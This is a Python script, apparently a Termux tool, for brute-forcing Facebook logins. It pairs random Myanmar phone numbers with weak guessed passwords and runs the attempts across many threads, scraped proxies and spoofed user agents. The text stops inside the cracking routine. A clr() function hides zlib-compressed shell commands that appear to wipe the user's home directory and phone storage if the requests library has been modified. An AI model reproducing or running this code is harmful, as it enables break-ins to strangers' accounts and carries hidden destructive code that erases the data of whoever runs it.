#Script Owner : Aung Zin Min
#---------------------
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,platform,zlib,hashlib
	from string import *
	import zipfile
	from uuid import uuid4
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	os.system('pip install requests > /dev/null')
	exit('\n Run Again ')
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('\x1b[1;95m[√] Proxy Downloads Fail...')
    os.system('clear')
prox=open('.prox.txt','r').read().splitlines()
os.system("termux-setup-storage")
os.system("git pull")
A="\033[1;91m"
B="\033[1;92m"
C="\033[1;93m"
D="\033[1;94m"
E="\033[1;95m"
F="\033[1;96m"
G="\033[1;97m"
H="\033[1;90m"
I="\033[38;5;205m"
J="\033[38;5;208m"
K="\033[38;5;206m"
L="\033[38;5;204m"
colour=random.choice([A,B,C,D,E,F,G,H,I,J,K,L])
colour2=random.choice([A,B,C,D,E,F,G,H,I,J,K,L])

from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import sessions
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass

def clr():
    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
    os.system('termux-setup-storage -y')
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
            print('[•] \033[1;92m FUCK YOU BRO ; FUCK BY MIN AH MAY LIN\033[0m');exit()
        else:exit()

    except:exit()

uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","SHIRO").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bmh_token = f'{id}{xp}'

logo=f"""
{colour}╔══════════════════════════════════════╗
{colour}║{G}  ╔═╗┬ ┬┬┬─┐┌─┐
{colour}║{B}  ╚═╗├─┤│├┬┘│ │ {G}ℂ𝕖𝕠 : 𝔸𝕦𝕟𝕘 ℤ𝕚𝕟 𝕄𝕚𝕟
{colour}║{E}  ╚═╝┴ ┴┴┴└─└─┘
{colour}╚══════════════════════════════════════╝
{colour}║ {G}  𝕍𝕖𝕣𝕤𝕚𝕠𝕟 : {B}𝕌𝕟𝕜𝕟𝕠𝕨𝕟{G}{B} {G}𝕊𝕥𝕒𝕥𝕦𝕤 : {B}ℙ𝕖𝕣𝕤𝕠𝕟𝕒𝕝{G}
{colour}╚══════════════════════════════════════╝"""

def clear():
    os.system("clear")
    print(logo)

def line():
    print(f"{colour}════════════════════════════════════════{G}")

loop = 0
oks = []
cps=[]
ugen=[]
ugen2=[]
ugen3=[]
sexy=[]
#Mozilla/5.0 (Linux; Android 5.1.0; Nokia Oppo Vivo) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 OPR/57.2.2830.52651
for xd in range(10000):
    rr = random.randint; rc = random.choice
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','12','13','14','14']
    miui_v3 = ['0','1','2','3','4','5','6','7','8','9','10','11','12','13','14','14']
    miui_v4 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-75505','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B',
    'GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT',
    'GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,14))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,124))}.0.{str(rr(2000,9999))}.{str(rr(40,999))} Mobile Safari/537.36"
#    ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,14))}; Nokia C12 Pro Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,124))}.0.{str(rr(2000,9999))}.{str(rr(50,999))} Mobile Safari/537.36"
#    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,14))}; {str(rc(basa))}; Mi RedMi Note 15 Pro Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,124))}.0.{str(rr(2000,9999))}.{str(rr(50,999))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rc(miui_v1))}.{str(rc(miui_v2))}.{str(rc(miui_v3))}-{str(rc(miui_v4))}"
    ugen.append(ugent1)

def ua_ios():
    gt = "en-us; GT-"
    m = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    o = random.randrange(11,999)
    n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    a = random.choice(["5","6","7","8","9","10","11","12","13","14","15","16","17"])
    b = random.choice(["1","2","3","4","5","6","7","8","9"])
    c = random.choice(["1","2","3","4","5","6","7","8","9"])
    letter = random.choice(["A","B","C","D","E"])
    fbcr = random.choice(["Mobifone","lifecell","2degrees","Carrier","Kyivstar","Three","Globe","Sprint","OPTUS","T-Mobile","HOTmobile","IAM","TFW","Play","Verizon","Viettel","VinaPhone","Telenor","Zong","Ufone","Mobily","TelenorHU","Omnitel","SMART","Tele2LT","OrangeFrance","VinaPhone","MegaFon","MetroPCS","Bite","MobileTeleSystems","TelekomHU","VodafoneIT","TelenorBG","MtelBG","AT&amp;T","TRUE-H","Telstra","O2","CSpire","dtac","TELIA","KPNNL","Virgin","AIS","vodafoneP","3Ireland","fido","MEO","NOS","UNITEL","POST"])
    en = random.choice(["ru_RU","en_US","en_GB","vi_VN","hu_HU","pt_PT","de_DE","fr_FR","es_LA","fr_FR","pt_BR","th_TH","da_DK","nl_NL","sv_SE","nb_NO",])
    version = str(random.randint(100,250))
    app_version = str(random.randint(100,445))+".0."+str(random.randint(4000,5000))+"."+str(random.randint(20,100))
    fbsv = str(random.randint(100000000,900000000))
    fbbd = str(random.randint(5,9))+","+str(random.randint(1,9))
    fbss = random.choice(["2","3"])
    ios = random.choice(["604.5.6","605.1.15","602.4.6","603.3.8","601.1.46","604.1.38","604.3.5","603.3.8","604.1.38","604.5.6"])
    return("Mozilla/5.0 (iPhone; CPU iPhone OS {}; {}{}{}{}) like Mac OS X) AppleWebKit/{} (KHTML, like Gecko) Mobile/15{}{} [FBAN/FBIOS;FBAV/{};FBBV/{};FBDV/iPhone{};FBMD/iPhone;FBSN/iOS;FBSV/{};FBSS/{};FBCR/{};FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]".format(a,gt,m,o,n,ios,letter,version,app_version,fbsv,fbbd,a,fbss,fbcr))

def ua_iphone():
    gt = "en-us; GT-"
    m = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    o = random.randrange(111,9999)
    n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    a = random.choice(["5","6","7","8","9","10","11","12","13","14","15","16","17"])
    b = random.choice(["1","2","3","4","5","6","7","8","9","0"])
    c = random.choice(["1","2","3","4","5","6","7","8","9","0"])
    letter = random.choice(["A","B","C","D","E"])
    fbcr = random.choice(["Mobifone","lifecell","2degrees","Carrier","Kyivstar","Three","Globe","Sprint","OPTUS","T-Mobile","HOTmobile","IAM","TFW","Play","Verizon","Viettel","VinaPhone","Telenor","Zong","Ufone","Mobily","TelenorHU","Omnitel","SMART","Tele2LT","OrangeFrance","VinaPhone","MegaFon","MetroPCS","Bite","MobileTeleSystems","TelekomHU","VodafoneIT","TelenorBG","MtelBG","AT&amp;T","TRUE-H","Telstra","O2","CSpire","dtac","TELIA","KPNNL","Virgin","AIS","vodafoneP","3Ireland","fido","MEO","NOS","UNITEL","POST"])
    en = random.choice(["ru_RU","en_US","en_GB","vi_VN","hu_HU","pt_PT","de_DE","fr_FR","es_LA","fr_FR","pt_BR","th_TH","da_DK","nl_NL","sv_SE","nb_NO",])
    version = str(random.randint(100,250))
    app_version = str(random.randint(100,445))+".0."+str(random.randint(4000,5000))+"."+str(random.randint(20,100))
    fbsv = str(random.randint(100000000,900000000))
    fbbd = str(random.randint(5,9))+","+str(random.randint(5,9))
    fbss = random.choice(["2","3"])
    ios = random.choice(["604.5.6","605.1.15","602.4.6","603.3.8","601.1.46","604.1.38","604.3.5","603.3.8","604.1.38","604.5.6"])
    return("Mozilla/5.0 (iPhone; CPU iPhone OS {}_{}_{}; {}{}{}{}) like Mac OS X) AppleWebKit/{} (KHTML, like Gecko) Mobile/15{}{} Safari/537.36".format(a,b,c,gt,m,o,n,ios,letter,version))

def ua_iphone1():
    gt = "en-us; GT-"
    m = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    o = random.randrange(100,9999)
    n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    a = random.choice(["5","6","7","8","9","10","11","12","13","14","15","16","17"])
    b = random.choice(["1","2","3","4","5","6","7","8","9","0"])
    c = random.choice(["1","2","3","4","5","6","7","8","9","0"])
    letter = random.choice(["A","B","C","D","E"])
    fbcr = random.choice(["Mobifone","lifecell","2degrees","Carrier","Kyivstar","Three","Globe","Sprint","OPTUS","T-Mobile","HOTmobile","IAM","TFW","Play","Verizon","Viettel","VinaPhone","Telenor","Zong","Ufone","Mobily","TelenorHU","Omnitel","SMART","Tele2LT","OrangeFrance","VinaPhone","MegaFon","MetroPCS","Bite","MobileTeleSystems","TelekomHU","VodafoneIT","TelenorBG","MtelBG","AT&amp;T","TRUE-H","Telstra","O2","CSpire","dtac","TELIA","KPNNL","Virgin","AIS","vodafoneP","3Ireland","fido","MEO","NOS","UNITEL","POST"])
    en = random.choice(["ru_RU","en_US","en_GB","vi_VN","hu_HU","pt_PT","de_DE","fr_FR","es_LA","fr_FR","pt_BR","th_TH","da_DK","nl_NL","sv_SE","nb_NO",])
    version = str(random.randint(100,250))
    app_version = str(random.randint(100,445))+".0."+str(random.randint(4000,5000))+"."+str(random.randint(20,100))
    fbsv = str(random.randint(100000000,900000000))
    fbbd = str(random.randint(5,9))+","+str(random.randint(5,9))
    fbss = random.choice(["2","3"])
    ios = random.choice(["604.5.6","605.1.15","602.4.6","603.3.8","601.1.46","604.1.38","604.3.5","603.3.8","604.1.38","604.5.6"])
    return("Mozilla/5.0 (iPhone; CPU iPhone OS {}_{}_{} like Mac OS X) AppleWebKit/{} (KHTML, like Gecko) Mobile/15{}{} Safari/537.36".format(a,b,c,ios,letter,version))

def ua_ios_iphone():
    gt = "en-us; GT-"
    az = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    ver = str(random.randint(1,999))
    az1 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    ios_version1 = str(random.randint(5,17))
    ios_version2 = str(random.randint(0,9))
    ios_version3 = str(random.randint(0,9))
    apple_webkit = random.choice(["604.5.6","605.1.15","602.4.6","603.3.8","601.1.46","604.1.38","604.3.5","603.3.8","604.1.38"])
    version = str(random.randint(5,17))+"."+str(random.randint(1,9))+"."+str(random.randint(1,9))
    letter = random.choice(["A","B","C","D","E"])
    seson = str(random.randint(100,155))
    return("Mozilla/5.0 (iPhone; CPU iPhone OS {}; {}{}{}{}) like Mac OS X) AppleWebKit/{} (KHTML, like Gecko) Version/{} Mobile/15{}{} Safari/604.1".format(ios_version1, gt, az, ver, az1, apple_webkit, version, letter, seson))

def ua_chrome():
    window_version = str(random.randint(9,11))
    chrome = str(random.randint(40,122))+".0."+str(random.randint(3000,7000))+"."+str(random.randint(50,250))
    opera = str(random.randint(40,122))+"."+str(random.randint(0,3))+"."+str(random.randint(2000,7000))+"."+str(random.randint(100000,600000))
    return("Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36 OPR/{}".format(window_version, chrome, opera))

def ua_linux():
    chrome = str(random.randint(40,124))+".0."+str(random.randint(0,5000))+"."+str(random.randint(0,180))
    return("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36".format(chrome))

def ua_xiaomi():
    android = str(random.randint(7,14))
    build = "RP1A."+str(random.randint(200000,250000))+".0"+str(random.randint(10,45))
    chrome = str(random.randint(80,122))+".0."+str(random.randint(3000,4500))+"."+str(random.randint(60,180))
    return("Mozilla/5.0 (Linux; U; Android {}; Redmi Note 11 Pro Build/{}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.13.2-gn".format(android, build, chrome))

def ua_xiaomi1():
    android = str(random.randint(7,14))
    build = "TP1A."+str(random.randint(200000,250000))+".0"+str(random.randint(10,45))
    chrome = str(random.randint(70,122))+".0."+str(random.randint(3000,4500))+"."+str(random.randint(60,180))
    return("Mozilla/5.0 (Linux; U; Android {}; en-us; Redmi Note 11R Build/{}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.21.1.1-gn".format(android, build, chrome))

def ua_xiaomi2():
    android = str(random.randint(7,14))
    build = "SKQ1."+str(random.randint(200000,250000))+".00"+str(random.randint(1,9))
    chrome = str(random.randint(80,122))+".0."+str(random.randint(5000,6500))+"."+str(random.randint(100,180))
    return("Mozilla/5.0 (Linux; U; Android {}; id-id; Redmi Note 12 Pro Build/{}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.2.0-gn".format(android, build, chrome))

def ua_xiaomi3():
    android = str(random.randint(4,14))+"."+str(random.randint(0,9))+"."+str(random.randint(0,9))
    chrome = str(random.randint(50,120))+".0."+str(random.randint(2000,6000))+"."+str(random.randint(100,180))
    return("Mozilla/5.0 (Linux; U; Android {}; ru-ru; Redmi 6 Pro Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.11".format(android, chrome))

def ua_samsung():
    android = str(random.randint(7,14))
    model = random.choice(["SM-G570F","SM-G570F","SM-G570Y","SM-G570M"])
    chrome = str(random.randint(80,122))+".0."+str(random.randint(4000,5000))+"."+str(random.randint(60,150))
    return("Mozilla/5.0 (Linux; Android {}; {} Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36".format(android, model, chrome))

def ua_samsung1():
    android = str(random.randint(7,14))
    model = random.choice(["SM-J400G","SM-J400F","SM-J400M"])
    browser = str(random.randint(9,19))
    chrome = str(random.randint(80,122))+".0."+str(random.randint(4000,5000))+"."+str(random.randint(60,150))
    return("Mozilla/5.0 (Linux; Android {}; SAMSUNG {}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{}.0 Chrome/{} Mobile Safari/537.36".format(android, model, browser, chrome))

def ua_pixel():
    android = str(random.randint(7,14))
    build = "TQ3A."+str(random.randint(230000,250000))+".00"+str(random.randint(1,9))+".S1"
    chrome = str(random.randint(80,122))+".0."+str(random.randint(6000,6500))+"."+str(random.randint(60,150))
    return("Mozilla/5.0 (Linux; Android {}; Pixel 4a Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36".format(android, build, chrome))

def ua_vivo():
    android = str(random.randint(6,14))
    build = "PKQ1."+str(random.randint(170000,250000))+".00"+str(random.randint(1,9))
    chrome = str(random.randint(60,122))+".0."+str(random.randint(3000,4500))+"."+str(random.randint(60,150))
    return("Mozilla/5.0 (Linux; Android {}; vivo 1805 Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36".format(android, build, chrome))

def ua_realme():
    android = str(random.randint(6,15))
    build = "UKQ1."+str(random.randint(220000,250000))+".00"+str(random.randint(1,9))
    chrome = str(random.randint(60,122))+".0."+str(random.randint(3000,5000))+"."+str(random.randint(60,150))
    return("Mozilla/5.0 (Linux; Android {}; RMX3706 Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36".format(android, build, chrome))

def phone_device_ua():
    android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
    model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
    build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
    chrome = str(random.randint(70,122))+".0."+str(random.randint(5000,6500))+"."+str(random.randint(250,350))
    opera_browser = str(random.randint(70,122))+".0."+str(random.randint(2000,5000))+"."+str(random.randint(40000,75000))
    ua = 'Mozilla/5.0 (Linux; U; Android '+str(android_version)+'; '+str(model)+' Build/'+str(build)+'; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(chrome)+' Mobile Safari/537.36 OPR/'+str(opera_browser)
    return ua

def ua_nokia():
    android = str(random.randint(4,14))+"."+str(random.randint(1,9))+"."+str(random.randint(1,9))
    chrome = str(random.randint(50,120))+".0."+str(random.randint(2000,4900))+"."+str(random.randint(100,150))
    ucbrowser = str(random.randint(6,15))+"."+str(random.randint(1,9))+"."+str(random.randint(1,9))+"."+str(random.randint(1000,2500))
    return("Mozilla/5.0 (Linux; U; Android {}; en-US; Nokia_Xplus Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} UCBrowser/{} Mobile Safari/537.36".format(android, chrome, ucbrowser))

def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[•] %s \x1b[1;95m YOUR ACTIVE APPS   :{G}'%(B))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r%s [%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[•] %s \x1b[1;95m YOUR EXPIRED APPS    :{G}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def main():
    clear()
    print(f"{G}[{B}•{G}] First Click 1 {G}({B}Give Permession{G})");line()
    lol = input(f'{G}[{B}•{G}] Choose : ');line()
    if lol =="1":
       os.system("termux-setup-storage -y");time.sleep(2.0);menu()
    else:
         print(f"{G}[{B}•{G}] {A}Sorry You Have Not Permession");line;time.sleep(2.0);main()

def menu():
	clear()
	print(f'{G}[{B}1{G}] Start Random Crack ');line()
	print(f'{G}[{B}0{G}] Exit ');line()
	line()
	opt = input(f'{G}[{B}?{G}] Choose : ')
	if opt =='1':
		myan_randome()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91m [•] Choose Vail Option\033[0;97m')

def myan_randome():
	user=[]
	clear()
	print(f"{G}[{B}1{G}] Method 1 (Recommend)")
	line()
	method = input(f"{G}[{B}•{G}] Choose : ")
	clear()
	print(f'{G}[{B}•{G}] For Myanmar {G}({B}977,797,667,447{G})')
	line()
	code = input(f'{G}[{B}•{G}] Input Code : ')
	line()
	limit = int(input(f"{G}[{B}•{G}] Limit : "))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with tred(max_workers=120) as bmh:
		clear()
		tl = str(len(user))
		print(f'{G}[{B}•{G}] 𝕋𝕠𝕥𝕒𝕝 𝕀𝕕𝕤  : {B}'+tl)
		print(f'{G}[{B}•{G}] ℂ𝕙𝕠𝕚𝕔𝕖 𝕊𝕚𝕞 : {B}'+code);line()
		for lee in user:
			ids = '+959'+code+lee
			passlist = [code+lee,lee,code+lee[:3],code+lee[:2],code+lee[:1],'Myanmar','Myanmar123','myanmar123','myanmar','kyawkyaw','zawzaw','aungaung','chitchit']
			if method in "1":
                           bmh.submit(rndm,ids,passlist)
			else:
                             bmh.submit(rndm,ids,passlist)
	line()
	print('[✓] ℂ𝕣𝕒𝕔𝕜 𝕡𝕣𝕠𝕔𝕖𝕤𝕤 𝕙𝕒𝕤 𝕓𝕖𝕖𝕟 𝕔𝕠𝕞𝕡𝕝𝕖𝕥𝕖𝕕')
	line()
	input('ℙ𝕣𝕖𝕤𝕤 𝔼𝕟𝕥𝕖𝕣 𝕋𝕠 𝔾𝕠 𝔹𝕒𝕔𝕜 𝕄𝕖𝕟𝕦');approveme()

#---------------------START-CRACK---------------------#
def rndm(ids,passlist):
	global loop
	global oks,cps
	try:
		for pas in passlist:
			sys.stdout.write(f'\r\r\033[1;37m({B}𝕊𝕙𝕚𝕣𝕠{G}) ({G}%s{G}) ({B}𝕆𝕂:-%s{G}) {G}({A}ℂℙ:-%s{G}) {G}'%(loop,len(oks),len(cps)));sys.stdout.flush()
			session = requests.Session()
